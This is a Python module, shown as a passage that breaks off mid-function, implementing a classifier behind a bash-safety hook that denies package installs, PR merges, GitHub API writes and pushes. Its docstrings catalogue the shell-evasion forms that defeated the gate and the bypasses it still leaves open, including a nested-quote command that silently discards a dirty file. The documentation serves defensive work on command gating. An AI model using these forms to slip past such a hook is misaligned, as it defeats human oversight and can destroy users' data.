"""Token-based classifier backing hooks/check-bash-safety.sh (issue #1326,
Stage 1 of the root-cause analysis on #1326).

Why this exists: the predecessor implementation matched a bash extended
regex against the raw, unexpanded shell source text of tool_input.command.
That is a substring scan over source text, not a check against what bash
will actually execute -- and bash's own expansion (quote removal,
parameter/array expansion, command substitution) makes the two different
strings. Live-verified (issue #1326): variable-split tool+verb
(`A=uv; B=install; $A $B foo`), quote-splitting (`u""v install foo`),
`${IFS}` substitution, positional-parameter indirection, and several other
techniques all defeated the raw-substring gate while still resolving to
the exact denied invocation once bash actually ran them -- and the
identical technique defeated `pip install`, `gh pr merge`, and `git push`
just as easily; this is a property of the whole regex-substring design,
not one pattern.

Root-cause analysis (dispatched to an independent subagent, recorded on
#1326) rejected a `bash -x` sandboxed-trace-normalization redesign on two
independently reproduced grounds: it is not side-effect-free (an empty-PATH
sandbox still let `/bin/rm` run by absolute path and let plain redirections
truncate files -- executing the exact untrusted input this gate exists to
police), and an environment-divergence oracle (`command -v uv && uv install
foo`) defeats it regardless of isolation strength, because the sandbox's
own absence of the real tool is directly observable and branch-able by the
attacker-controlled command. Widening isolation only widens that gap.

That analysis also measured that no text-only gate can be both sound and
low-false-positive: a policy that soundly denies every non-literal
(dynamic) command produced a 28% false-positive rate against ordinary,
legitimate dynamic bash usage. This module is therefore Stage 1 of a
two-stage plan, not a claimed full closure:

  1. Tokenize with the standard library's own shlex (POSIX quote/backslash
     rules, punctuation-aware so shell operators become their own tokens)
     instead of matching raw text. Dequoting alone soundly closes the
     quote-splitting and backslash-escape bypass subclass with no new gap
     (`u""v install` and `gi""t push` both dequote to their plain form).
  2. Deterministically normalize the well-known `${IFS}`/`$IFS`
     whitespace-substitution trick by splitting on that exact marker before
     matching -- sound, not heuristic, because that marker means
     "whitespace" in exactly the exploited construction.
  3. For the small number of remaining bypass techniques that hide a
     tool/verb pair behind genuine shell indirection (a variable, a
     positional parameter, an array, a command substitution used as the
     command word or a verb-position argument), apply a narrow, adversarially
     re-tested heuristic (see _rule_b1a_dynamic_word_same_segment_verb,
     _rule_b1b_dynamic_word_assigned_tool_and_verb, and
     _rule_b2_watched_tool_dynamic_verb_position below) that denies only
     when a *specific*, checked structural pattern is present -- not merely
     "this command contains a dynamic construct anywhere" (that blanket
     form is exactly what produced the 28% false-positive rate).

Known, disclosed limitation (per dimension 9 of
skills/evaluating-deterministic-gate-quality/references/dimensions.md):
this does NOT close every conceivable indirection. Verb reconstruction
that never places the tool or verb name as its own literal token anywhere
in the command -- string-slicing a fused variable
(`cmd=uvinstall; eval "${cmd:0:2} ${cmd:2}" foo`) or building the argv
through an array literal assignment
(`A=(uv); V=(install); "${A[@]}" "${V[@]}" foo`) -- still evades Stage 1.
Full closure requires Stage 2 (execution-boundary enforcement: a native
git pre-push hook, package-registry network-egress blocking, and gh
token re-scoping), tracked separately per #1326's own stated scope
boundary, not attempted here.

A second, distinct instance of the same underlying class (found live by
Step 8 independent review, fourth round): `_rule_gh_api_write`'s own
`gh api graphql` "mutation" keyword check is a raw substring scan over
the whole command text, not a token match -- sound against a literal
"mutation" keyword, but not against one reconstructed at runtime by
concatenating two or more separately-assigned variables
(`A=muta; B=tion; Q="${A}${B} { ... }"; gh api graphql -f query="$Q"`).
Soundly closing this would require resolving nested `${NAME}` references
through recursive variable substitution -- the same unbounded-
reconstruction problem as the verb-reconstruction residual above,
manifesting here for a keyword embedded in a free-text query value
instead of a command/verb token. Deliberately not attempted in Stage 1;
pinned as `graphql-mutation-keyword-variable-concatenation` in
hooks/test_gitapex_check_bash_safety.py's own `KNOWN_BYPASS_COMMANDS`.

CRITICAL, disclosed, whole-module limitation, NOT specific to any one rule
(found live by Step 8 independent review, round 8 of issue #1375's own
checkout/restore feature review, while stress-testing an unrelated,
narrower fix): `tokenize()`'s own reliance on the standard library's
`shlex` tracks double-quote state as one flat, whole-command toggle, with
no concept of bash's own recursive quote-context reset inside a `$(...)`
command substitution. A double-quoted span nested inside a `$(...)` that
is itself nested inside an outer double-quoted string desynchronizes
`shlex`'s own quote parity from real bash's actual parse while keeping
the TOTAL double-quote count even across the whole command -- so
`tokenize()`'s own `TokenizeError` fail-closed path never fires, unlike
the structurally-safe, always-unbalanced quote-decoy shape documented
elsewhere in this module. Live-verified real, silent data loss: `x="$(echo
"y)" && git checkout -- dirty.py)"` genuinely discards a dirty tracked
file when actually executed, while `classify()` reports `deny=False` with
"git"/"checkout" never appearing as their own separate tokens at all --
fused into what `shlex` mis-reads as inert quoted content. This is a
property of `shlex` itself, not any rule built on top of it (checkout/
restore, git push, pip install, gh api all share this exposure equally),
and predates issue #1375. Deliberately NOT attempted here -- tracked as
its own dedicated issue, https://github.com/tvna/gitapex/issues/1404,
since a genuine fix needs a command-substitution-aware recursive
tokenizer, not a narrow patch; pinned as `shlex-nested-double-quote-
inside-command-substitution-full-bypass` in
hooks/test_gitapex_check_bash_safety.py's own `KNOWN_BYPASS_COMMANDS`.

Closed by fifth-round Step 8 independent review: `_gh_api_method_dynamic_
value`/`_gh_api_field_dynamic_hit` (and the earlier literal-token scans)
only ever recognized a dynamic VALUE fused onto a literal `-X`/`--method`/
`-f`/`--field`/`--raw-field` flag prefix -- none of them handled the flag
NAME ITSELF being a bare variable reference as its own token
(`F=-X; M=POST; gh api .../merge $F $M`), since a token that is purely
`$F` carries no literal flag-shaped text at all for those scans to match
against. Unlike the graphql residual above, this one IS closed in Stage
1: `_resolve_bare_var` narrowly resolves a token only when it is *exactly*
one bare `$NAME`/`${NAME}` reference (no other shape), then
`_gh_api_method_flagname_dynamic_hit`/`_gh_api_field_flagname_dynamic_hit`
check whether that resolves to a known flag name -- the same bounded,
single-level `name_to_value` lookup every other B-rule here already uses,
not the unbounded recursive reconstruction the two residuals above would
require.

Closed by sixth-round Step 8 independent review: both `_gh_api_method_
dynamic_hit` and `_gh_api_method_flagname_dynamic_hit` resolved a dynamic
`-X`/`--method` VALUE by collecting every variable the value token
referenced and checking whether any ONE of their individually-resolved
values was itself a complete write method -- so a value split across
multiple concatenated variables (`-X "$M1$M2"` with `M1=PO`, `M2=ST`)
was never recognized, even though bash concatenates them into a real
`POST` write with no separator. Closed via `_substitute_var_refs`, which
replaces every `$NAME`/`${NAME}` reference in a token with its resolved
value (preserving surrounding literal text) and checks the *reconstructed*
string -- still a single, bounded substitution pass over `name_to_value`
entries that are themselves already plain literal strings, not the
unbounded recursive reconstruction the graphql-mutation-keyword residual
above requires (that residual concatenates variables into a keyword
buried in free-text search content; this one concatenates variables into
a flag's own value, a small bounded comparison set of four write
methods).

Closed by seventh-round Step 8 independent review, against the sixth
round's own fix: `_substitute_var_refs` preserves a token's literal text
exactly as typed -- only the substituted variable *values* are
already-lowercased (per `_assigned_literals`'s own convention) -- so an
uppercase literal fragment fused with a variable in the SAME token
(`-X "PO$M"` with `M=ST`) reconstructed to "POst", which the
case-sensitive `.startswith()` comparison never matched against the
lowercase `_WRITE_METHODS` set. Every round-6 test exercised only a
whole-variable-per-fragment split (`M1=PO; M2=ST`), which happens to
already be all-lowercase after resolution, so this case-normalization gap
went unexercised until this round. Closed by lowercasing the
*reconstructed* string immediately before the write-method comparison at
both call sites, matching the lowercasing convention every literal-token
comparison in this module already follows.

Closed by eighth-round Step 8 independent review, a more fundamental gap
than rounds 6-7: shlex's own quote removal (tokenize's whole reason for
existing) discards WHICH characters were originally inside quotes. A
quoted, bounded reference immediately followed by more identifier-shaped
literal text (`"$M"ST`) and a bare, unquoted reference whose name simply
happens to be longer (`$MST`) both dequote to the *identical* raw token
text -- there is no way to recover, from the token alone, which reading
bash actually used. The prior single-greedy-match version of what is now
`_substitute_var_refs_candidates` always assumed the maximal-munch
(unquoted) reading, so `M=PO; gh api .../merge -X"$M"ST` -- a real
`-XPOST` write, confirmed via `bash -c` argv expansion -- was wrongly
allowed, since "MST" itself was never assigned. Closed not by picking a
different single guess, but by trying every non-empty prefix of an
unbraced identifier run as a candidate variable name (`_unbraced_ref_
options`) and checking every resulting reading (`_write_method_candidate_
hit`) -- a real write hidden behind either interpretation is now caught.
Still bounded, not the graphql residual's unbounded recursion: the
branching factor is the length of one already-fixed identifier run, not
re-expansion of a value that might itself contain `$` -- and an explicit
cap (`_MAX_SUBSTITUTION_CANDIDATES`) fails closed (treats the token as an
unresolved-but-plausible match) rather than silently truncating if a
pathological token's combinatorial expansion would exceed it.

Closed by the same eighth-round Step 8 independent review, immediately
after the fix above: the identical quote-boundary ambiguity also applies
when the -X/--method/-f/--field flag NAME itself (not just its value) is
fused directly with its own value in the SAME token -- `F=-X; gh api
.../merge "$F"POST` dequotes to the single token `$FPOST`, and
`FF=-f; gh api ... "$FF"name=value` dequotes to `$FFname=value`. Neither
the bare-anchored flag-name check (round 5, requires the flag token to be
*exactly* `$NAME`, nothing fused after it) nor the literal-text-prefix
dynamic-value check (round 2/6/7/8, requires the token to already start
with literal "-x"/"--method"/"-f"/"--field"/"--raw-field" text) recognizes
this shape, since the flag character itself is not literally present
anywhere in the token's own text before substitution. Closed by
`_gh_api_method_fused_flagname_dynamic_hit`/`_gh_api_field_fused_
flagname_dynamic_hit`, which check every candidate reconstruction of the
WHOLE token (via `_substitute_var_refs_candidates`) against the same
fused-flag shapes already recognized for a literal token -- not a new
detection rule, only extending an existing one to a token whose resolved
reading was not knowable until substitution.

Closed by ninth-round Step 8 independent review, a DIFFERENT bypass class
than rounds 5-8 (those all shared one root cause -- shlex's own quote
removal; this one is bash's own default-value expansion): bash's
`${NAME:-default}`/`${NAME-default}`/`${NAME:=default}`/`${NAME=default}`
parameter expansion evaluates to the literal DEFAULT text whenever NAME
is unset (or, for the `:`-prefixed forms, empty) -- a zero-assignment
mechanism for embedding literal text directly in a token. Before this
fix, `_substitute_var_refs_candidates` only ever recognized `$NAME`/
`${NAME}`, so the entire `${...}` construct was left as untouched literal
text and never matched any write-method comparison
(`gh api .../merge -X${TOTALLY_NEVER_MENTIONED-POST}` -- confirmed via
real bash argv expansion to resolve to an actual `-XPOST` write -- was
wrongly allowed). More severely, the SAME construct also fully bypassed
`_rule_b1a_dynamic_word_same_segment_verb`/`_rule_b1b_dynamic_word_
assigned_tool_and_verb` -- the most basic install-verb/gh-pr-merge
detection, not just the gh-api-specific checks rounds 5-8 closed --
since neither rule ever looked at a token's own embedded default-clause
text, only a literal token's own text or a referenced variable's
assigned value: `${NEVER_SET:-uv} ${NEVER_SET2:-install} foo` (confirmed
via real bash to resolve to a genuine `uv install foo`) needed NO
variable assignment anywhere in the command at all. Closed via
`_default_clause_literal` (an anchored, whole-token extraction used by
the B-rules) and a third alternative added to `_substitute_var_refs_
candidates`'s own regex (a non-anchored form, so it can also be found
fused within a larger token, e.g. `-X${NAME-POST}`) -- both contribute
the literal DEFAULT text as a candidate reading, PLUS NAME's own resolved
value if it also happens to be assigned (an extra safety-margin
candidate, since this classifier cannot know at gate time whether NAME
will actually be unset/empty at bash's own real runtime). The DEFAULT
text itself is not recursively re-scanned for further `$` references it
might contain (e.g. `${UNSET:-$OTHER}`) -- a disclosed residual, the same
"not the unbounded reconstruction problem" boundary already drawn
elsewhere in this module. The identical fix was ported to the
self-contained duplicate at
skills/executing-a-branch-plan/scripts/gitapex_check_task_bash_safety.py
(its own B1a/B1b, `_rule_gh_any`, and `_rule_git_push` all shared the
same gap).

Closed by tenth-round Step 8 independent review, a THIRD distinct bypass
class (rounds 5-8: shlex's own quote removal; round 9: bash's default-
value expansion; this one: bash's own `${!NAME}` indirect-reference
syntax): `${!NAME}` is a TWO-LEVEL lookup -- NAME's own assigned value
names a SECOND variable, and the whole expression evaluates to THAT
variable's own assigned value (`TOOLREF=T; T=uv; ${!TOOLREF}` resolves,
at real bash's own runtime, to a genuine `uv`). Before this fix, none of
this module's indirection machinery recognized this syntax at all -- not
merely mis-resolved, but contributing NOTHING to any rule's own
referenced-name/value collection, so a tool/verb/write-method hidden this
way was entirely invisible. Closed via `_resolve_indirect_ref` (used
directly by B1a/B1b and the gh-api flag-name sub-passes, and folded into
`_substitute_var_refs_candidates`'s own regex as a fourth alternative for
the gh-api value path) plus a new `_assigned_raw_values` map: the
first-level lookup needs NAME's assigned value as a CASE-PRESERVED key
into the second lookup (bash variable names are case-sensitive), so it
cannot reuse the existing `_assigned_literals`/`name_to_value` map, which
intentionally lowercases every RHS for this module's other, case-
insensitive tool/verb/write-method comparisons. The identical fix was
ported to the self-contained duplicate at
skills/executing-a-branch-plan/scripts/gitapex_check_task_bash_safety.py,
which additionally had a fourth, unrelated tenth-round gap of its own:
`_rule_npx`/`_rule_bare_install`/`_rule_fetch_exec` previously checked
only a token's own literal text, with NO indirection handling of any
kind (`N=npx; $N left-pad` bypassed npx detection entirely) -- closed
there via a new unifying `_resolve_dynamic_token` helper (bare variable,
default clause, or `${!NAME}`, in that order) shared by all three rules.

Closed by eleventh-round Step 8 independent review: rounds 9 and 10 each
added a NARROW, whole-token-anchored resolver to B1a/B1b
(`_default_clause_literal`, `_resolve_indirect_ref`) that requires the
ENTIRE token to be exactly one recognized construct -- sound for that
shape alone, but blind to the same construct FUSED with literal text in
the same token (`in${!SUFREF}`, reconstructing to "install" once SUFREF
resolves two levels to "stall"). `_substitute_var_refs_candidates`
(the gh-api value path's own resolver since round 8) already handles
every reference shape this module recognizes -- bare, default-clause, or
`${!NAME}` -- FUSED or not, via its own non-anchored regex; B1a/B1b
simply never called it, instead re-deriving a narrower subset of the
same resolution logic through two anchored point-fixes. Confirmed live
via real bash argv expansion: `T=uv; SUFNAME=SUFVAL; SUFVAL=stall; $T
in${!SUFNAME} foo` resolves to a genuine `uv install foo`, and (fusing
BOTH the tool and the verb, one per token) `HSUF=HVAL; HVAL=h; MSUF=MVAL;
MVAL=erge; g${!HSUF} pr m${!MSUF} 1` resolves to a genuine `gh pr merge
1` -- both fully bypassed B1a/B1b before this fix. Closed by having B1a
and B1b call `_substitute_var_refs_candidates` directly for every dynamic
token, the same primitive the gh-api rules already relied on, rather than
maintaining a second, narrower resolution path. This made
`_default_clause_literal` and the module-level `_VAR_REF_RE` (B1b's own
prior bare-reference collector, superseded by the same call) fully
unused, so both were removed rather than left as dead code --
`_resolve_bare_var` and `_resolve_indirect_ref` were kept, on the
reasoning that the gh-api flag-NAME resolution path only needs to test a
token as a single whole-or-nothing shape, since (this round's own claim)
"a flag name is never fused with other text the way a value can be."
Round twelve found that claim wrong -- see below. The identical finding
and fix were ported to the self-contained duplicate at
skills/executing-a-branch-plan/scripts/gitapex_check_task_bash_safety.py,
which additionally had NO general fused-token resolver of its own at all
(only the tenth round's narrow `_resolve_dynamic_token`, itself built
from the same kind of anchored point-fixes) -- `_substitute_var_refs_
candidates` (and its own supporting `_VAR_REF_FULL_RE`/
`_unbraced_ref_options`/`_MAX_SUBSTITUTION_CANDIDATES`) was ported there
for the first time this round, and every rule that previously called
`_resolve_dynamic_token` or inlined the default-clause-plus-indirect-ref
pattern (`_rule_bare_install`, `_rule_fetch_exec`, `_rule_npx`,
`_rule_gh_any`, `_rule_git_push`, B1a, B1b) now calls the ported function
directly -- which also made `_resolve_dynamic_token`, `_resolve_bare_var`,
`_default_clause_literal`, `_resolve_indirect_ref`, and `_VAR_REF_RE` all
fully unused there (unlike this module, the task file's `gh`/git-push
detection is a blanket deny with no flag-NAME-shaped sub-case that would
still need a whole-token-only resolver), so all five were removed too.

Closed by twelfth-round Step 8 independent review: round eleven's own
premise for leaving the gh-api flag-NAME path on the narrower
`_resolve_bare_or_indirect`/`_resolve_bare_var`/`_resolve_indirect_ref`
resolvers -- "a flag name is never fused with other text the way a value
can be" -- was wrong. Confirmed live via real bash argv expansion:
`M=method; gh api .../issues --$M POST` resolves to a genuine `--method
POST` write, and the field-flag counterpart `FF=field; gh api ...
--$FF name=value` resolves to a genuine `--field name=value` write --
both fully bypassed `_gh_api_method_flagname_dynamic_hit`/
`_gh_api_field_flagname_dynamic_hit`, since the literal `--` prefix fused
onto the reference defeats every one of those resolvers' anchored
`^...$` matches, the exact same fusion class round eleven closed for
B1a/B1b/`_rule_gh_any`/etc. -- left open here under an incorrect premise
about this one specific token position. Closed by having both
flag-NAME-resolution functions call `_substitute_var_refs_candidates`
directly instead, checking every candidate reading against the known
flag-name set rather than a single whole-or-nothing resolution. This
made `_resolve_bare_or_indirect` (introduced this same round, in the
immediately preceding commit, specifically to deduplicate those two
functions' shared narrower-resolver call) -- and, in turn,
`_resolve_bare_var`/`_BARE_VAR_RE` and `_resolve_indirect_ref`/
`_INDIRECT_REF_RE` themselves, once `_resolve_bare_or_indirect` was their
only remaining caller -- fully unused, so all five were removed. Every
token/reference resolution in this module now goes through the single
`_substitute_var_refs_candidates` primitive (or, for the two-level
`${!NAME}` lookup specifically, its own inlined equivalent of the same
logic that function's docstring already documents) -- no narrower,
whole-token-anchored resolver remains anywhere in the file. The task
file was not exposed to this specific finding: its `gh`/`git push`
detection is a blanket deny with no flag-NAME sub-case at all, so it
never had an equivalent narrower resolver to leave behind in the first
place.

Closed by fourteenth-round Step 8 independent review, ported from the
task-scoped sibling module's own fourteenth-round fix of the same
finding: a command substitution (`$(...)`) embedded in another command
was invisible to every rule in this classifier -- `_is_dynamic` marks
the whole span dynamic, but `_substitute_var_refs_candidates` never
matches its shape, so it flowed through as unmodified, never-matching
literal text instead of being treated as unresolved. This surfaced as
TWO distinct live bypasses needing TWO distinct fixes, neither
sufficient alone: a general literal-token-adjacency bypass (`$(echo
pip) install foo`, confirmed live via a real bash proxy that the
substitution genuinely resolves to `pip install foo`) where
`segment_tokens` split a bare command word from whatever followed a
`(`, putting a tool name and its verb in two different segments -- and
a BARE, unassigned, unquoted `$(...)` occupying the ENTIRE command
position (`$(echo "uv install foo")`, a pre-existing regression test)
whose own OUTPUT is word-split and re-executed as a brand-new command
by bash. Closed by `_fold_command_substitution_spans` (a new tokenizer
pass folding each `$(...)` span into one opaque, always-dynamic token
BEFORE segmenting, keeping the verb in the SAME segment as the now-
opaque command word) plus `_rule_command_substitution_content`
(recursively classifies each span's own inner tokens, since folding
alone makes danger INSIDE a substitution -- or a substitution's own
inner content that only becomes dangerous once re-executed as the
whole command line -- invisible to the outer command's own rule
dispatch). An early version of `_fold_command_substitution_spans` also
special-cased `_substitute_var_refs_candidates` itself to fail closed
on ANY `$(` -- this over-broadened the fail-closed behavior into
whole-segment scanners (B1a/B1b) that resolve EVERY dynamic token in a
segment: a lone, standalone assignment segment with an unresolvable
RHS (`x=$(date +%s); echo $x`, confirmed live: harmless) was wrongly
denied by B1b's own segment-wide resolve. Reverted; closed instead via
the narrower, position-specific `_is_unresolvable_substitution` guard,
used only at the exact gh-api flag-name/flag-value resolution call
sites that check ONE security-relevant token position, never inside
the shared, whole-segment-scanning primitives themselves.

Closed by fifteenth-round Step 8 independent review, ported from the
task-scoped sibling module's own fifteenth-round fix of the same four
findings (see that module's own docstring for the full root-cause
analysis and live-verification detail): (1) a leading `NAME=value`
environment-assignment prefix (`X=foo $T install foo`) defeated B1a/
B1b's own `_is_dynamic(seg[0])` gate and B2's literal-tool check --
closed by `_strip_leading_assignments`, applied once to every segment
in `_classify_tokens`. (2) A token with TWO fused `$(...)` substitutions
only ever had its first span scanned -- closed by threading a `search_
from` parameter through `_find_fused_command_substitution`. (3) This
module's own `is_git_push` warn-only field was silently dropped for a
`$(...)`-wrapped git push (`x=$(git push origin main)`), since `git
push` alone is warn-only here (not a hard deny the recursive check's
own early-return-only-on-deny would have propagated) -- closed by
scanning `_rule_command_substitution_content` unconditionally and
OR-ing every span's own `is_git_push` into a running total, returned
regardless of whether any span was itself denied. (4) Bash's own
array-literal syntax (`NAME=(elem1 elem2)`) is indistinguishable, from
the token stream alone, from an empty assignment immediately followed
by an unrelated subshell -- `declare -a arr=($(seq 1 5))` was wrongly
denied once the array's own element list became `seg[0]` of its own
segment (via B1a/B1b's own gate). Closed by `_fold_array_literal_spans`,
folding the whole span into one still-`NAME=`-shaped token (so `_strip_
leading_assignments` removes it entirely) BEFORE segmenting.

Closed by issue #1350, filed separately from #1326 (a materially
different bypass shape -- segment-boundary loss, not verb-token-
splitting): `segment_tokens`'s own `_SINGLE_OPS` set was written from the
start to include a literal newline, showing clear intent to treat it as a
real bash statement separator exactly like `;` -- but `tokenize()`'s own
shlex configuration silently absorbed a bare newline as ordinary
whitespace instead of ever emitting it as a token, making that `"\n"`
member unreachable dead code (confirmed live: a newline-joined two-
statement command collapsed into one flat token run with no trace of the
newline at all). See `tokenize()`'s and `_strip_line_continuations`'s own
docstrings for the full live-verified fix, covering both the statement-
separator gap itself and a second, related gap the fix's own verification
against the backslash-newline continuation case turned up along the way.

Deliberately stdlib-only (shlex, re, json) -- no new third-party
dependency, matching this repository's declarative module-management
convention and python3's already-accepted-hook-dependency status (see
hooks/gitapex_check_post_write_provenance.py and five further sibling
hooks that already shell out to python3).
"""

from __future__ import annotations

import json
import re
import shlex
import sys
from typing import NamedTuple

# --- Tokenization ------------------------------------------------------

# shlex's own default punctuation set under punctuation_chars=True
# ('();<>|&'), plus a literal newline -- passed as an explicit string to
# `shlex.shlex` in `tokenize()` below, rather than relying on the `True`
# shortcut, specifically so newline can join it (issue #1350: see
# `tokenize()`'s own docstring for why the `True` shortcut alone leaves
# this set's own "\n" member unreachable).
_SINGLE_OPS = {";", "|", "&", "(", ")", "\n"}
_MULTI_OPS = {"&&", "||"}
_ASSIGN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")

# Matches one `$NAME`/`${NAME}`/`${NAME:-default}`/`${!NAME}` reference
# anywhere in a token, capturing its full span (including the braces, when
# present) so _substitute_var_refs_candidates below can replace exactly
# that span. The third alternative (default-clause) is NOT anchored
# (`[^}]*` instead of `.*$`) -- it must stop at the first unescaped `}` so
# it can be found anywhere within a larger fused token (e.g.
# `-X${NEVER_SET-POST}`), not just when the construct is the whole token.
_VAR_REF_FULL_RE = re.compile(
    r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}"
    r"|\$\{([A-Za-z_][A-Za-z0-9_]*):?[-=]([^}]*)\}"
    r"|\$\{!([A-Za-z_][A-Za-z0-9_]*)\}"
    r"|\$([A-Za-z_][A-Za-z0-9_]*)"
)

# Safety valve for _substitute_var_refs_candidates' own combinatorial
# expansion (see its docstring) -- a bounded cap, not a silent truncation:
# exceeding it makes the caller treat the token as an unresolved-but-
# plausible match (fail closed), never as a quietly-dropped possibility.
_MAX_SUBSTITUTION_CANDIDATES = 64


def _unbraced_ref_options(name_run: str, name_to_value: dict[str, str]) -> list[str]:
    """Every sound reading of an UNBRACED `$NAME_RUN` reference, as a list
    of (resolved-value + leftover-literal-suffix) strings -- one per
    non-empty prefix of NAME_RUN that is actually assigned, longest
    prefix first. See _substitute_var_refs_candidates' own docstring for
    why more than the single longest-prefix reading is needed here."""
    return [
        name_to_value[name_run[:i]] + name_run[i:] for i in range(len(name_run), 0, -1) if name_run[:i] in name_to_value
    ]


def _substitute_var_refs_candidates(
    token: str, name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> list[str] | None:
    """Every sound reconstruction of TOKEN with each `$NAME`/`${NAME}`
    reference replaced by its assigned (already-lowercased) value,
    preserving any literal text around or between references -- e.g.
    `$M1$M2` with M1="po", M2="st" becomes "post". Returns `[]` (cannot
    resolve at all) if some reference has no assigned-and-in-range
    reading; returns `None` (too many readings to enumerate -- treat as
    unresolved but plausible, i.e. fail closed) if the combinatorial
    expansion below would exceed `_MAX_SUBSTITUTION_CANDIDATES`.

    A BRACED reference (`${M}`) is unambiguous -- the brace itself
    survives shlex's quote removal and unambiguously bounds the name --
    and contributes exactly one reading, same as the single-reading
    version this replaces. An UNBRACED reference (`$M`) is NOT
    unambiguous once shlex has already dequoted the token: `"$M"ST` (a
    quoted, bounded reference to `M` followed by literal `ST`) and
    `$MST` (a bare, unquoted reference to a variable literally named
    `MST`, bash's own maximal-munch parse) both dequote to the identical
    raw token text `$MST` -- shlex does not preserve which characters
    were inside the quotes. Found live by Step 8 independent review,
    eighth round (issue #1326): the prior single-greedy-match version of
    this function always assumed the maximal-munch (unquoted) reading,
    so `M=PO; gh api .../merge -X"$M"ST` -- a real `-XPOST` write once
    bash resolves it, confirmed via `bash -c` argv expansion -- was
    wrongly allowed, since "MST" was never itself assigned. Every
    non-empty prefix of an unbraced run that IS assigned is now tried as
    a candidate reading (`_unbraced_ref_options`), so a real write
    hidden behind either interpretation is still caught.

    Still bounded, not the unbounded recursive reconstruction the module
    docstring's graphql-mutation-keyword residual disclaims: `name_to_
    value`'s own entries are themselves already plain literal strings (a
    dynamic RHS is filtered out before ever entering `name_to_value` --
    see `_assigned_literals`), so this never re-expands a substituted
    value that might itself contain `$` -- it only branches over where
    one already-fixed identifier run might have been quote-bounded, a
    small, explicitly-capped enumeration.

    A `${NAME:-default}`/`${NAME-default}`/`${NAME:=default}`/
    `${NAME=default}` reference contributes the literal DEFAULT text as a
    candidate, PLUS NAME's own resolved value if NAME also happens to be
    assigned in this command (an extra safety-margin candidate: this
    classifier cannot know, at gate time, whether NAME will actually be
    unset/empty at bash's own real runtime -- an inherited environment
    variable is one example outside this classifier's own tracking).
    Found live by Step 8 independent review, ninth round (issue #1326):
    `gh api .../merge -X${TOTALLY_NEVER_MENTIONED-POST}` resolves (real
    bash, confirmed via argv expansion) to a real `-XPOST` write with NO
    variable assignment anywhere in the command at all -- the prior
    version of this function only ever recognized `$NAME`/`${NAME}`,
    never bash's own default-value expansion, so the entire construct was
    left as untouched literal text and never matched the write-method
    comparison. The DEFAULT text itself is not recursively re-scanned for
    further `$` references it might itself contain (e.g.
    `${UNSET:-$OTHER}`) -- a disclosed residual, the same "not the
    unbounded reconstruction problem" boundary this function already
    draws elsewhere, not attempted here.

    A `${!NAME}` reference (bash's own indirect reference -- a TWO-LEVEL
    lookup: NAME's own assigned value, read via `name_to_raw_value`
    case-preserved since bash variable names are case-sensitive, names a
    SECOND variable, whose own `name_to_value` entry is the final,
    lowercased result) contributes NAME's
    doubly-resolved value as its one candidate, or no candidate at all if
    either lookup level fails. Found live by Step 8 independent review,
    tenth round (issue #1326): `MREF=M; M=POST; gh api .../merge
    -X${!MREF}` resolves (real bash, confirmed via argv expansion) to a
    real `-XPOST` write -- the prior version of this function never
    recognized this syntax at all, so the construct was left as untouched
    literal text, same class of gap as the ninth round's default-clause
    finding but a different bash feature.

    Deliberately does NOT special-case an embedded command substitution
    (`$(...)`) or backtick substitution here -- an earlier version of
    this fix (Step 8 independent review, fourteenth round, issue #1326)
    made this function fail closed (return `None`) on ANY token
    containing either marker, which propagates through whole-segment
    scanners like `_rule_b1b_dynamic_word_assigned_tool_and_verb` that
    resolve EVERY dynamic token in a segment: `x=$(date +%s); echo $x`
    (confirmed live: harmless) was wrongly denied, since the lone
    assignment segment `x=$(date +%s)` -- a single dynamic token, no
    separate tool/verb structure at all -- fail-closed on its own
    unresolvable RHS. `_rule_command_substitution_content` and the
    narrow, position-specific `_is_unresolvable_substitution` guards at
    each rule that checks ONE security-relevant token position (not a
    whole segment) close the real bypasses this would have closed,
    without that collateral false-positive -- see each one's own
    docstring."""
    partials = [""]
    pos = 0
    for match in _VAR_REF_FULL_RE.finditer(token):
        braced_name = match.group(1)
        default_name = match.group(2)
        default_text = match.group(3)
        indirect_name = match.group(4)
        if braced_name is not None:
            if braced_name not in name_to_value:
                return []
            options = [name_to_value[braced_name]]
        elif default_name is not None:
            options = [default_text]
            if default_name in name_to_value:
                options.append(name_to_value[default_name])
        elif indirect_name is not None:
            referenced_name = name_to_raw_value.get(indirect_name)
            resolved = name_to_value.get(referenced_name) if referenced_name is not None else None
            options = [resolved] if resolved is not None else []
        else:
            options = _unbraced_ref_options(match.group(5), name_to_value)
        if not options:
            return []
        if len(partials) * len(options) > _MAX_SUBSTITUTION_CANDIDATES:
            return None
        literal_before = token[pos : match.start()]
        partials = [p + literal_before + opt for p in partials for opt in options]
        pos = match.end()
    tail = token[pos:]
    return [p + tail for p in partials]


class TokenizeError(Exception):
    pass


def _is_dynamic(token: str) -> bool:
    return "$" in token or "`" in token


def _ifs_split(token: str) -> list[str]:
    """`${IFS}`/`$IFS`, unexpanded, deterministically means "whitespace" in
    the exploited construction (default IFS is space/tab/newline) -- this
    is a sound normalization, not a heuristic, unlike the dynamic-token
    rules below."""
    for marker in ("${IFS}", "$IFS"):
        if marker in token:
            parts = [p for p in token.split(marker) if p]
            if len(parts) > 1:
                return parts
    return [token]


def _split_punct_run(token: str) -> list[str]:
    """shlex's punctuation_chars mode merges adjacent punctuation
    characters into one token when nothing separates them (e.g. `);`
    becomes one token `');'`, not `)` then `;`) -- true 2-char shell
    operators (&&, ||) are the one case that must stay merged."""
    if token in _MULTI_OPS:
        return [token]
    if token and all(c in _SINGLE_OPS for c in token):
        return list(token)
    return [token]


def _command_substitution_token_span(tokens: list[str], i: int) -> int | None:
    """If `tokens[i]` ends with `$` and `tokens[i + 1]` is `(` (the shape
    an UNQUOTED `$(...)` command substitution takes once shlex has split
    it: `$` and `(` always land as separate tokens, since `(` is a
    punctuation character shlex breaks the current word at, see
    `_split_punct_run`'s own docstring), return the index one past the
    matching `)` -- tracking paren-nesting depth across the intervening
    tokens so a nested subshell or command substitution does not end the
    span early. Returns `None` if `tokens[i]` does not open a span here
    (including the QUOTED case, where shlex's own quote removal already
    leaves the whole `$(...)` fused as one token before this function
    ever runs -- see `_find_fused_command_substitution` for that shape).

    Shared by `_fold_command_substitution_spans` (folds the span into one
    opaque token) and `_rule_command_substitution_content` (recursively
    classifies the span's own inner tokens) -- factored out by Step 8
    independent review, fourteenth round (issue #1326), so the two do not
    grow independently-drifting copies of the identical paren-depth scan."""
    if not (tokens[i].endswith("$") and i + 1 < len(tokens) and tokens[i + 1] == "("):
        return None
    depth = 1
